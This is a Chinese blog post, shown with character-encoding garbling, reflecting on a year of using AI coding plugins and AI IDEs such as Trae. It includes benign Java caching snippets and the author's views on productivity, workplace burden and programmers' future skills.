<p>2024 å¹´å¤§å®¶å£ä¸­çš„â€œAgent å…ƒå¹´â€å¯¹å¾ˆå¤šæŠ€æœ¯äººæ¥è¯´çƒ­é—¹ä½†ä¸æŒä¹…ã€‚å„ç§æ™ºèƒ½ä½“ç¤¾åŒºï¼ˆåƒ Cozeã€å…ƒå™¨ã€åƒå¸†ã€æ–‡å¿ƒè¿™äº›ï¼‰åœ¨ 2024 å¹´æœ‰ä¸€æ®µæ—¶é—´éå¸¸æ´»è·ƒï¼Œä½†åˆ° 2025 å¹´ä½ ä¼šå‘ç°ï¼Œçƒ­é—¹é€€å»äº†ï¼Œè®¨è®ºå˜å¾—æ›´åŠ¡å®ï¼šä¸æ˜¯å»äº‰è°çš„ Agent æ›´â€œèªæ˜â€ï¼Œè€Œæ˜¯çœ‹è°èƒ½æŠŠ AI æ›´å¥½åœ°åµŒå…¥åˆ°æ¯å¤©å†™ä»£ç ã€äº¤ä»˜äº§å“çš„æµç¨‹é‡Œã€‚
å¯¹æˆ‘ä¸ªäººè€Œè¨€ï¼ŒçœŸæ­£å‘ç”Ÿâ€œè´¨å˜â€çš„ï¼Œæ˜¯ AI IDE çš„å…´èµ·ã€‚ä»Šå¹´å›½å†…å‡ å®¶å¤§å‚éƒ½æ¨å‡ºäº†è‡ªå®¶çš„ AI IDEï¼ˆåƒ Traeã€CodeBuddyã€Qoder ç­‰ï¼‰ï¼Œå®ƒä»¬æŠŠ AI ä»â€œè¾¹ç¼˜æ’ä»¶â€æ‹‰åˆ°äº†å¼€å‘è€…ä¸»æˆ˜åœºï¼Œè¿™ä¸€ç‚¹æ¯”ä»€ä¹ˆâ€œè°çš„ Agent æ›´èªæ˜â€è¦é‡è¦å¾—å¤šã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a19840c6c2d4611ba5252007415f9f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yqq5Yqb55qE5bCP6Zuo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767958405&amp;x-signature=wRCghqC0R0M4TS9DzWQryY%2BHrhY%3D" alt="fca28f2d6cdfa15b8cf36f8b9c1553a0" loading="lazy"/></p>
<h2 data-id="heading-1">æ’ä»¶ç››è¡Œï¼šä»è¡¥å…¨åˆ°è¡Œçº§æ³¨é‡Šçš„è¯•æ°´</h2>
<p>èµ·åˆï¼Œå¤§å¤šæ•°äººæ¥è§¦ AI ç¼–ç¨‹çš„å…¥å£è¿˜æ˜¯å„ç§æ’ä»¶ï¼šMarscodeã€è…¾è®¯å…ƒä»£ç åŠ©æ‰‹ã€é€šä¹‰çµç è¿™æ ·çš„å·¥å…·ä¸»è¦åšä»£ç è¡¥å…¨ã€æ³¨é‡Šã€è¡Œçº§æ”¹å†™ã€‚å’Œå¾ˆå¤šåŒäº‹ä¸€æ ·ï¼Œæˆ‘ä¹Ÿå»å‚åŠ è¿‡è¿™äº›å‚å•†çš„æ´»åŠ¨ï¼Œè¯•ç”¨äº†ä¸å°‘æ’ä»¶ã€‚è¯´å®è¯ï¼Œè¿™ç±»æ’ä»¶åœ¨æ—¥å¸¸å°äº‹ä¸Šç¡®å®èƒ½çœåŠ›ï¼š</p>
<ul>
<li>å†™æµ‹è¯•ä»£ç ï¼šç”Ÿæˆæµ‹è¯•ç”¨ä¾‹ã€Mock æ•°æ®ã€ç¤ºä¾‹è¯·æ±‚ä½“ï¼Œé€Ÿåº¦æ˜æ˜¾æå‡ã€‚</li>
<li>æ³¨é‡Šä¸æ–‡æ¡£ï¼šæŠŠå¤æ‚å‡½æ•°ç”¨æ›´é€šä¿—çš„è¯è§£é‡Šå‡ºæ¥ï¼Œæ–¹ä¾¿ reviewã€‚</li>
<li>ä»£ç ç‰‡æ®µä¸æ¨¡æ¿ï¼šå¿«é€Ÿæ’å…¥æ¡†æ¶æ¨¡æ¿ï¼ˆä¾‹å¦‚ Spring Boot çš„åŸºç¡€ Controllerã€Service å±‚æ¨¡æ¿ï¼‰ã€‚</li>
</ul>
<p>ä½†å¯¹äºâ€œè¦ä¸Šçº¿çš„æ ¸å¿ƒé€»è¾‘â€ï¼Œæˆ‘ä¸€ç›´æ¯”è¾ƒè°¨æ…â€”â€”åŸå› å¾ˆç®€å•ï¼šæ’ä»¶åœ¨å¤„ç†ä¸Šä¸‹æ–‡ã€æ¶æ„ä¸€è‡´æ€§ã€è¾¹ç•Œå¼‚å¸¸ã€å¹¶å‘åœºæ™¯è¿™äº›æ–¹é¢çš„ä¸ç¡®å®šæ€§ï¼Œä»ç„¶éœ€è¦äººå·¥æŠŠå…³ã€‚æ¢å¥è¯è¯´ï¼Œæ’ä»¶é€‚åˆâ€œåŠ é€Ÿä½é£é™©å·¥ä½œâ€ï¼Œä½†ä¸é€‚åˆå®Œå…¨æ›¿ä»£å·¥ç¨‹å¸ˆçš„ä¸“ä¸šåˆ¤æ–­ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e528717a34784017a61fee1ec3b508cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yqq5Yqb55qE5bCP6Zuo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767958405&amp;x-signature=GJaWSwoI18Q2WPyU9e11lJKnWSc%3D" alt="c61301c45ce66b024fc661bbb063dc25" loading="lazy"/></p>
<h2 data-id="heading-2">AI IDE çš„åˆ°æ¥ï¼šä»å·¥å…·é“¾æ”¹é€ åˆ°å·¥ä½œæ–¹å¼å‡çº§</h2>
<p>å¹´ä¸­å¼€å§‹ï¼Œå„å®¶çº·çº·æ¨å‡º AI IDEï¼šå®ƒä»¬ä¸æ˜¯å•çº¯çš„è¡¥å…¨æ’ä»¶ï¼Œè€Œæ˜¯æŠŠ AI èƒ½åŠ›å’Œå¼€å‘æµç¨‹æ·±åº¦æ†ç»‘åœ¨ä¸€èµ·â€”â€”é¡¹ç›®å¯¼èˆªã€è§„èŒƒé©±åŠ¨å¼€å‘ã€ä»£ç è¯„å®¡å»ºè®®ã€è‡ªåŠ¨ç”Ÿæˆå•æµ‹ã€ç”šè‡³æŠŠæ–‡æ¡£å’Œå®ç°è¿æˆé—­ç¯ã€‚
å¯¹æˆ‘å½±å“æœ€å¤§çš„ï¼Œæ˜¯ Trae çš„ SOLO åŠŸèƒ½ï¼šå¯¹ç¼–ç¨‹æ–°æ‰‹å‹å¥½ï¼Œè®©â€œä¸ä¼šå†™ä»£ç çš„äººâ€ä¹Ÿèƒ½é€šè¿‡äº¤äº’å¼å¼•å¯¼æŠŠæƒ³æ³•è½åœ°ï¼Œè¿™ä¸ AI ç¼–ç¨‹çš„åˆè¡·å¾ˆè´´åˆï¼šé™ä½å…¥é—¨é—¨æ§›ã€æŠŠåˆ›æ„å˜æˆå¯è¿è¡Œçš„äº§å“åŸå‹ã€‚</p>
<p>ä»¥å‰å†™ç¨‹åºåƒå­¦å¼€è½¦ï¼Œå¾—å…ˆå­¦ç¦»åˆã€æ¢æŒ¡ã€æ–¹å‘ç›˜ï¼›AI IDE æ›´åƒæŠŠæ–¹å‘ç›˜ã€æ²¹é—¨åšæˆäº†è‡ªåŠ¨åŒ–å¥—ä»¶ï¼Œä½ åªè¦æè¿°ç›®çš„åœ°ï¼ˆéœ€æ±‚ï¼‰ï¼Œç³»ç»Ÿè´Ÿè´£ç»™å‡ºè·¯çº¿ä¸æ“ä½œå»ºè®®ã€‚ä½†è¿™å¹¶ä¸æ„å‘³ç€å¸æœºå¯ä»¥å®Œå…¨æ”¾ç©ºâ€”â€”åœ¨å¤æ‚äº¤é€šï¼ˆå¤æ‚ä¸šåŠ¡åœºæ™¯ï¼‰é‡Œï¼Œè¿˜æ˜¯éœ€è¦è€å¸æœºçš„åˆ¤æ–­ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25a516f73e74431a894f3683ffdfc696~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yqq5Yqb55qE5bCP6Zuo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767958405&amp;x-signature=nDHoDh1%2BV0jzTy3KWsYwXpvc0T4%3D" alt="dce8161a3b241322395017b480609556" loading="lazy"/></p>
<h2 data-id="heading-3">æˆ‘å¦‚ä½•åœ¨å·¥ä½œä¸­ä½¿ç”¨ AI IDEï¼ˆä»¥åŠé‡åˆ°çš„é—®é¢˜ï¼‰</h2>
<p>åœ¨å…¬å¸é‡Œå¹¶æ²¡æœ‰ç¡¬æ€§è¦æ±‚å¿…é¡»ä½¿ç”¨ AI IDEï¼Œä½†å› ä¸ºèƒ½æé«˜äº§å‡ºï¼Œé¢†å¯¼é¼“åŠ±å¤§å®¶å¤šå°è¯•ã€‚æˆ‘çš„å®è·µå¯ä»¥åˆ†ä¸ºå‡ ç±»ï¼š</p>
<ol>
<li><strong>éœ€æ±‚ä¸æ–‡æ¡£é©±åŠ¨å¼€å‘</strong>ï¼šå…ˆç”¨ AI å¸®æˆ‘æŠŠéœ€æ±‚å†™æˆè§„èŒƒæ€§çš„æ–‡æ¡£ï¼ˆåŒ…æ‹¬æ¥å£å®šä¹‰ã€æ•°æ®æ¨¡å‹ã€å¼‚å¸¸åœºæ™¯ï¼‰ï¼Œç”Ÿæˆåˆç‰ˆæŠ€æœ¯æ–¹æ¡ˆï¼Œå†åŸºäºæ–‡æ¡£å®šå‘ç”Ÿæˆä»£ç éª¨æ¶ã€‚</li>
<li><strong>å•å…ƒæµ‹è¯•ä¸é›†æˆæµ‹è¯•åŠ é€Ÿ</strong>ï¼šå€ŸåŠ© IDE çš„æµ‹è¯•ç”Ÿæˆèƒ½åŠ›ï¼Œæˆ‘èƒ½ä¸€é”®ç”Ÿæˆå¤§é‡å•æµ‹æ ·ä¾‹ï¼Œè¦†ç›–å¸¸è§è¾¹ç•Œæ¡ä»¶ï¼ˆè™½ç„¶è¿˜éœ€è¦æ‰‹å·¥æ”¹é€ æ–­è¨€ï¼‰ã€‚</li>
<li><strong>ä»£ç å®¡æŸ¥ä¸é‡æ„å»ºè®®</strong>ï¼šAI ç»™å‡ºçš„é‡æ„å»ºè®®å’Œé™æ€åˆ†ææç¤ºï¼Œæœ‰æ—¶èƒ½å‘ç°æˆ‘åœ¨å¹¶å‘ã€ç¼“å­˜ä¸€è‡´æ€§ä¸Šçš„éšæ‚£ã€‚</li>
<li><strong>å¿«é€ŸåŸå‹ä¸ MVP</strong>ï¼šç”¨ AI IDE å¿«é€Ÿæ­å»ºäº§å“åŸå‹ï¼ŒæŠŠæ ¸å¿ƒæµç¨‹è·‘é€šï¼Œå†è¿­ä»£ä¼˜åŒ–ã€‚</li>
</ol>
<p><strong>é‡åˆ°çš„é—®é¢˜</strong>ï¼š</p>
<ul>
<li>AI ç”Ÿæˆçš„ä»£ç é£æ ¼ä¸å›¢é˜Ÿè§„èŒƒæœ‰æ—¶ä¸ä¸€è‡´ï¼ˆéœ€è¦ç»Ÿä¸€çš„ formatter å’Œ lint æµç¨‹ï¼‰ã€‚</li>
<li>è¾ƒä¸ºå¤æ‚çš„ä¸šåŠ¡é€»è¾‘â€”â€”å°¤å…¶æ˜¯æ¶‰åŠäº‹åŠ¡ã€åˆ†å¸ƒå¼ä¸€è‡´æ€§æ—¶ï¼ŒAI çš„å»ºè®®å¾€å¾€â€œä¸å¤Ÿä¸¥è°¨â€ã€‚</li>
<li>å›¢é˜Ÿä¸­æ¥å—åº¦ä¸ä¸€ï¼Œæœ‰çš„äººæŠŠ AI å½“ä½œâ€œä¼šå†™ä»£ç çš„åŒäº‹â€ï¼Œæœ‰çš„äººå´è®¤ä¸ºä»£ç ç”Ÿæˆèƒ½åŠ›ä½ä¸‹ä¸æ„¿ä½¿ç”¨ã€‚</li>
</ul>
<h2 data-id="heading-4">AI å¦‚ä½•ææ•ˆä¸é£é™©</h2>
<p>ä¸¾ä¸ªå®é™…çš„ Java åœºæ™¯ï¼šæˆ‘ä»¬è¦å®ç°ä¸€ä¸ªç¼“å­˜æ›´æ–°ç­–ç•¥ï¼Œä¿è¯åœ¨é«˜å¹¶å‘ä¸‹ä¸ä¼šå‡ºç°ç¼“å­˜ç©¿é€ä¸ç¼“å­˜é›ªå´©ã€‚ä¼ ç»Ÿåšæ³•æ˜¯æ‰‹å†™é”ã€è®¾ç½®åˆç†çš„è¿‡æœŸç­–ç•¥ã€ä½¿ç”¨äºŒçº§ç¼“å­˜ç­‰ã€‚ç”¨ AI IDE çš„æµç¨‹å¯èƒ½æ˜¯ï¼š</p>
<ol>
<li>åœ¨ IDE ä¸­æè¿°éœ€æ±‚ï¼š<code>é«˜å¹¶å‘åœºæ™¯ï¼ŒæŸ API é¢‘ç¹è¯·æ±‚ï¼Œéœ€é˜²æ­¢ç¼“å­˜å‡»ç©¿ã€ä¿è¯ N ç§’å†…çƒ­ç‚¹æ•°æ®å¯ç”¨ã€‚</code></li>
<li>AI ç”Ÿæˆå®ç°è‰æ¡ˆï¼ˆç¤ºä¾‹ï¼‰ï¼š</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getWithCache</span><span class="hljs-params">(String key, Supplier&lt;Object&gt; dbSupplier)</span> {
    <span class="hljs-type">Object</span> <span class="hljs-variable">cached</span> <span class="hljs-operator">=</span> cache.get(key);
    <span class="hljs-keyword">if</span> (cached != <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> cached;
    <span class="hljs-keyword">synchronized</span> (getLockForKey(key)) {
        cached = cache.get(key);
        <span class="hljs-keyword">if</span> (cached != <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> cached;
        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> dbSupplier.get();
        cache.put(key, value, Duration.ofMinutes(<span class="hljs-number">5</span>));
        <span class="hljs-keyword">return</span> value;
    }
}
</code></pre>
<ol start="3">
<li>æˆ‘ä¼šåŸºäº AI çš„è‰æ¡ˆåšå®¡æŸ¥ä¸æ”¹è¿›ï¼šæŠŠ <code>synchronized</code> æ¢æˆåŸºäº Redis çš„åˆ†å¸ƒå¼é”æˆ–ä½¿ç”¨ <code>Caffeine</code> çš„ <code>computeIfAbsent</code>ï¼ŒåŠ ä¸Šç¼“å­˜ç©ºå€¼ç­–ç•¥ä¸é™æµé™çº§ã€‚ä¾‹å¦‚ï¼š</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨ Caffeine</span>
loadingCache.get(key, k -&gt; {
    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> dbSupplier.get();
    <span class="hljs-keyword">return</span> value == <span class="hljs-literal">null</span> ? NULL_PLACEHOLDER : value;
});
</code></pre>
<p>ä¸Šé¢çš„æµç¨‹å±•ç¤ºäº† AI çš„ä½œç”¨ï¼šå¿«é€Ÿç»™å‡ºå¯è¿è¡Œçš„è‰æ¡ˆï¼ŒèŠ‚çœäº†æ€è·¯ç»„ç»‡ä¸æ ·æ¿ä»£ç çš„æ—¶é—´ï¼›ä½†å…³é”®å†³ç­–ï¼ˆé”ç­–ç•¥ã€ç©ºå€¼å¤„ç†ã€ç›‘æ§ä¸ç†”æ–­ï¼‰ä»éœ€è¦å·¥ç¨‹å¸ˆæ¥æŠŠå…³ã€‚</p>
<h2 data-id="heading-5">æˆ‘çš„â€œTrae æ•…äº‹â€ï¼šä»ç”¨æˆ·åˆ° Fellow çš„æˆé•¿</h2>
<p>å¹´æœ«æˆ‘æˆä¸ºäº† Trae Fellowï¼Œè¿™ä¸ä»…ä»…æ˜¯ä¸€ä¸ªç§°å·ï¼Œæ›´æ˜¯ä¸€æ¬¡è¿‘è·ç¦»è§‚å¯Ÿ AI IDE äº§å“å½¢æ€ä¸ç¤¾åŒºç”Ÿæ€çš„æœºä¼šã€‚é€šè¿‡å‚ä¸å†…éƒ¨æ´»åŠ¨ã€å­¦ä¹ å…¶ä»–äººçš„æœ€ä½³å®è·µï¼Œæˆ‘çœ‹åˆ°äº†ä¸€ä¸ªäº‹å®ï¼šAI ç¼–ç¨‹çš„æ™®åŠä¸å†å±€é™äºä¸€çº¿åŸå¸‚çš„å¤§ç‰›åœˆå­ï¼Œåˆå­¦è€…ã€åˆ›ä¸šè€…ã€å°å­¦ç”Ÿéƒ½èƒ½é€šè¿‡æ›´å‹å¥½çš„äº§å“ä¸Šæ‰‹å¼€å‘ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8684713704e24798b4561995d4c6d31a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yqq5Yqb55qE5bCP6Zuo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767958405&amp;x-signature=HmsH5JQAirVpsuZBk7jcBPm0kUA%3D" alt="da506794fdf36b7f6d0889acdf0f0f49" loading="lazy"/></p>
<p>ä¸€ä»¶æˆ‘è‡ªå·±çš„å°äº‹ï¼šç”¨ Trae åšäº†ä¸€ä¸ªâ€œå¿«é€Ÿç”Ÿæˆé™æ€ HTML æ¸¸æˆâ€çš„å°å·¥å…·ï¼Œæµç¨‹æ˜¯å…ˆç”¨ AI ç”Ÿæˆéœ€æ±‚ï¼Œå†è‡ªåŠ¨ç”Ÿæˆé¡µé¢ã€äº¤äº’è„šæœ¬ä¸ç´ æï¼ˆéƒ¨åˆ†ç´ æç”¨ AI ç”Ÿå›¾æ›¿ä»£ï¼‰ï¼Œæœ€åç”¨æˆ·å¯ä»¥åœ¨æµè§ˆå™¨é‡Œç›´æ¥é¢„è§ˆå¹¶ç»§ç»­è¿­ä»£ã€‚åé¢å†è¯¦ç»†è¯´ä¸‹ã€‚</p>
<h2 data-id="heading-6">å¯¹æˆ‘å·¥ä½œä¸ç”Ÿæ´»çš„å½±å“</h2>
<p>çœŸå®æƒ…å†µæ˜¯AI ç»™æˆ‘å¸¦æ¥äº†æ”¶ç›Šï¼Œä¹Ÿå¸¦æ¥äº†è´Ÿæ‹…ã€‚</p>
<p><strong>æ”¶ç›Šéƒ¨åˆ†</strong>ï¼š</p>
<ul>
<li>å·¥ä½œæ•ˆç‡æå‡ï¼šé‡å¤æ€§ä»»åŠ¡ã€æ¨¡æ¿ç”Ÿæˆã€åˆç‰ˆä»£ç ç”± AI å¿«é€Ÿå®Œæˆï¼Œæˆ‘æŠŠæ›´å¤šç²¾åŠ›æ”¾åœ¨æ¶æ„ä¸è®¾è®¡ä¸Šã€‚</li>
<li>åˆ›æ„è½åœ°æ›´å¿«ï¼šä»¥å‰ä¸€ä¸ªæƒ³æ³•éœ€è¦å†™å¾ˆå¤šæ ·æ¿ä»£ç æ‰èƒ½éªŒè¯ï¼Œç°åœ¨èƒ½å¾ˆå¿«åšå‡ºè·‘é€šçš„åŸå‹ã€‚</li>
<li>ä¸ªäººå“ç‰Œä¸äº§å‡ºï¼šå‚ä¸ AI æ´»åŠ¨ã€æ’°å†™å®è·µæ–‡ç« ï¼Œè®©æˆ‘åœ¨ç¤¾åŒºé‡Œçš„èƒ½è§åº¦æå‡ï¼Œå¸¦æ¥ä¸€äº›å¥–é¡¹ä¸è®¤å¯ã€‚</li>
</ul>
<p><strong>è´Ÿæ‹…éƒ¨åˆ†</strong>ï¼š</p>
<ul>
<li>é¢å¤–ä»»åŠ¡å¢å¤šï¼šå…¬å¸ä¼šæŠŠâ€œAI æ™®åŠâ€â€œAI ææ•ˆâ€ä½œä¸ºé¢å¤–æŒ‡æ ‡ï¼Œå‚ä¸å…¶ä»–é¡¹ç›®ã€å†™æ–‡æ¡ˆã€åš demo çš„å·¥ä½œè¢«ç®—ä½œâ€œé¢å¤–äº§èƒ½â€ï¼Œå ç”¨äº†æœ¬å¯ä¼‘æ¯çš„æ—¶é—´ã€‚</li>
<li>è–ªé…¬ä¸å·¥ä½œé‡ä¸æˆæ­£æ¯”ï¼šè¿™æ˜¯å¾ˆå¤šäººä¼šç¢°åˆ°çš„èŒåœºçŸ›ç›¾â€”â€”åšäº†æ›´å¤šå·¥ä½œï¼Œæœªå¿…èƒ½ç«‹åˆ»åæ˜ åœ¨è–ªèµ„ä¸Šã€‚</li>
<li>ç²¾ç¥ç–²åŠ³ï¼šæŒç»­è·Ÿè¿›æ–°å·¥å…·ã€æ–°èƒ½åŠ›éœ€è¦ä¸æ–­å­¦ä¹ ï¼Œé•¿æœŸä¸‹æ¥ç¡®å®è€—ç²¾åŠ›ã€‚è¦çŸ¥é“ç°åœ¨æ–°çš„ä¸“ä¸šåè¯æŒ‡ä¸å®šæŸå¤©å°±å†’å‡ºæ¥äº†ï¼Œä½†å‡¡ä½ æ‹–å‡ å¤©åˆå‡ºæ¥ä¸€ä¸ªã€‚é˜²ä¸èƒœé˜²ã€‚</li>
</ul>
<p>å¦‚æœä½ å¯¹ AI çœŸæœ‰å…´è¶£ï¼Œé‚£å°±æŠŠå®ƒå½“ä½œâ€œæŠ¤å…·â€ï¼Œè®©è‡ªå·±æ›´å¼ºï¼Œé’ˆå¯¹å…¬å¸éƒ¨åˆ†æˆ‘æƒ³è¯´çš„æ˜¯èƒ½å°‘å‚ä¸å°±å°‘å‚ä¸ï¼Œå¯¹äºå¤§éƒ¨åˆ†å…¬å¸æ¥è¯´ï¼Œä½ ä¼šçš„è¶Šå¤šï¼Œå¹²çš„å°±è¶Šå¤šã€‚å¥½äº†å¤¸ä½ ä¸€å¥ï¼Œåšä¸å¥½è¿˜å¾—ä½ çš„å°è±¡ä¸å¥½ã€‚å‡å°‘ä¸€äº›ç„¦è™‘å§ç»™è‡ªå·±ã€‚</p>
<h2 data-id="heading-7">ä»é›¶åˆ°ä¸€çš„å®è·µ</h2>
<p>åœ¨å¹´åº•æˆ‘å†™äº†å‡ ç¯‡å…³äº Vibe Coding çš„å®è·µæ–‡ç« ï¼Œå¹¶åŸºäºè§„èŒƒé©±åŠ¨å¼€å‘åšäº†ä¸€ä¸ªå¼€æºé¡¹ç›®â€”â€”ä¸€ä¸ªèƒ½æ ¹æ®ç”¨æˆ·æè¿°å¿«é€Ÿç”Ÿæˆ HTML é™æ€å°æ¸¸æˆçš„å·¥å…·ã€‚é¡¹ç›®æµç¨‹å¤§è‡´æ˜¯ï¼š</p>
<ol>
<li>ç”¨ AI è§£æç”¨æˆ·æ„å›¾ï¼Œè‡ªåŠ¨ç”Ÿæˆéœ€æ±‚æ–‡æ¡£ã€‚</li>
<li>åŸºäºæ–‡æ¡£ç”Ÿæˆé¡µé¢ç»“æ„ï¼ˆHTML/CSSï¼‰ã€ç®€å•è„šæœ¬ï¼ˆJSï¼‰ä¸å ä½ç´ æï¼ˆå›¾ç‰‡ã€éŸ³æ•ˆï¼‰ã€‚</li>
<li>ç”¨æˆ·åœ¨é¡µé¢ä¸Šèƒ½å®æ—¶æ›¿æ¢ç´ æã€è¯·æ±‚ AI ä¼˜åŒ–é€»è¾‘æˆ–æ ·å¼ã€‚</li>
</ol>
<p>è¯æ˜äº†â€œæŠŠ AI å½“ä½œäº§å“èƒ½åŠ›è€Œéé»‘ç›’â€çš„æ€è·¯æ˜¯å¯è¡Œçš„ï¼šé€šè¿‡è§„èŒƒæŠŠâ€œæƒ³æ³• â†’ æ–‡æ¡£ â†’ ä»£ç  â†’ è¿è¡Œâ€é“¾è·¯è¿é€šï¼Œé™ä½äº†å…¥é—¨é—¨æ§›ï¼Œä¹Ÿæå‡äº†äº§å‡ºæ•ˆç‡ã€‚è¯¥é¡¹ç›®å‚åŠ äº†å‡ ä¸ªæ¯”èµ›å¹¶è·å¥–ä¸€ä¸ªæ˜¯æ–‡ç« å¾æ–‡ï¼Œå¦ä¸€ä¸ªæ˜¯å®æˆ˜æ¯”èµ›ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8cbace245a434efc9bab64b37e12b3e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yqq5Yqb55qE5bCP6Zuo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767958405&amp;x-signature=v%2Bh0FRCg0b4Z%2BnxZo7nGDOHo2vE%3D" alt="425b4fcad7d55485ba8f71861cca88cd" loading="lazy"/></p>
<h2 data-id="heading-8">ç¨‹åºå‘˜çš„æŠ¤åŸæ²³è¯¥å¦‚ä½•é‡å»ºï¼Ÿ</h2>
<p>æˆ‘ä»Šå¹´æ¯æ¬¡åˆ©ç”¨AI IDEå®ç°äº†éœ€æ±‚æˆ–è€…é¡¹ç›®ï¼Œæˆ‘å°±ä¼šè€ƒè™‘è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘è®¤ä¸ºæœªæ¥å‡ å¹´ï¼Œç¨‹åºå‘˜çš„â€œæŠ¤åŸæ²³â€ä¼šå‘ç”Ÿå¾®å¦™å˜åŒ–ã€‚ä»¥å¾€é åŸºç¡€ç¼–ç¨‹åŠŸåº•åƒé¥­çš„æ—¶ä»£ï¼Œé¢å¯¹å¤§å‹æ¨¡å‹äº§å‡ºçš„é«˜è´¨é‡ä»£ç ï¼Œä¼˜åŠ¿ä¼šè¢«éƒ¨åˆ†èš•é£Ÿã€‚çœŸæ­£é•¿è¿œçš„æŠ¤åŸæ²³ï¼Œå¯èƒ½æ¥è‡ªï¼š</p>
<ul>
<li><strong>ç³»ç»Ÿæ€§æ€ç»´ä¸æ¶æ„èƒ½åŠ›</strong>ï¼šè¯†åˆ«åœºæ™¯ã€æ‹†è§£å¤æ‚é—®é¢˜ã€è®¾è®¡æ­£ç¡®çš„è¾¹ç•Œä¸æ¼”è¿›è·¯å¾„ã€‚</li>
<li><strong>é¢†åŸŸçŸ¥è¯†ä¸ä¸šåŠ¡ç†è§£</strong>ï¼šæŠ€æœ¯åªæ˜¯å·¥å…·ï¼Œç†è§£ä¸šåŠ¡ã€æŠŠæŠ€æœ¯å’Œä¸šåŠ¡è¿æ¥æ˜¯æ›´éš¾ä¸”æ›´æœ‰ä»·å€¼çš„èƒ½åŠ›ã€‚</li>
<li><strong>äº§å“ä¸åä½œèƒ½åŠ›</strong>ï¼šå¦‚ä½•æŠŠ AI èƒ½åŠ›èå…¥å›¢é˜Ÿæµç¨‹ã€åˆ¶å®šè§„èŒƒã€æŠŠæ§è´¨é‡ã€‚</li>
<li><strong>å·¥ç¨‹å®è·µä¸å¯è§‚æµ‹æ€§</strong>ï¼šæ„å»ºå¯æµ‹è¯•ã€å¯å›æº¯ã€å¯ç»´æŠ¤çš„ç³»ç»Ÿï¼Œå°¤å…¶åœ¨å¤§è§„æ¨¡åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ã€‚</li>
</ul>
<p>æ¢è¨€ä¹‹ï¼Œæœªæ¥æ›´åƒæ˜¯â€œäºº + AIâ€çš„åä½œèµ›è·‘ï¼Œè°èƒ½æŠŠ AI å½“ä½œå·¥å…·å¹¶åšåˆ°æ›´é«˜é˜¶çš„è¿ç”¨ï¼Œè°å°±èƒ½åœ¨ç«äº‰ä¸­ä¿æŒä¼˜åŠ¿ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dded703bc96741bc8299835bfa23bb74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yqq5Yqb55qE5bCP6Zuo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767958405&amp;x-signature=eHNQ6wHG%2BpHuRRBo%2FJHFqonsyzI%3D" alt="b62b31151c8e3fe474b9f2d087db8962" loading="lazy"/></p>
<h2 data-id="heading-9">å°ç»“</h2>
<p>å›é¡¾è¿™ä¸€å¹´ï¼Œæˆ‘æ—¢äº«å—åˆ°äº† AI å¸¦æ¥çš„æ•ˆç‡çº¢åˆ©ï¼Œä¹Ÿä½“ä¼šåˆ°äº†å˜é©æœŸçš„ç„¦è™‘ã€‚AI IDE æŠŠæŠ€æœ¯å‰ç½®ï¼ŒæŠŠèƒ½åŠ›ä¸‹æ²‰ï¼Œè®©æ›´å¤šäººèƒ½å‚ä¸åˆ°â€œç”¨è½¯ä»¶è§£å†³é—®é¢˜â€çš„è¿‡ç¨‹ä¸­æ¥ã€‚å¯¹äºåƒæˆ‘è¿™æ ·çš„å·¥ç¨‹å¸ˆï¼Œæ—¢è¦å­¦ä¼šåˆ©ç”¨è¿™äº›å·¥å…·ï¼Œä¹Ÿè¦åœ¨å¤æ‚åœºæ™¯é‡Œä¿ç•™åˆ¤æ–­åŠ›ã€æŠŠæ§è´¨é‡ã€ä¸æ–­æå‡èƒ½å¸¦æ¥å·®å¼‚åŒ–ä»·å€¼çš„æŠ€èƒ½ã€‚</p>
<p>å¦‚æœè¦ç”¨ä¸€å¥è¯æ€»ç»“ï¼šä¸è¦æŠŠ AI å½“ä½œå¨èƒï¼ŒæŠŠå®ƒå½“ä½œæ”¾å¤§å™¨ï¼Œè®©ä½ çš„æ€è€ƒä¸å½±å“åŠ›æ›´è¿œã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[èŠ±è´¹äº†è¿‘ $100 æˆ‘å°†ApiHug Vibe ç¼–ç¨‹æ¨¡å¼è·‘é€šäº†]]></title>    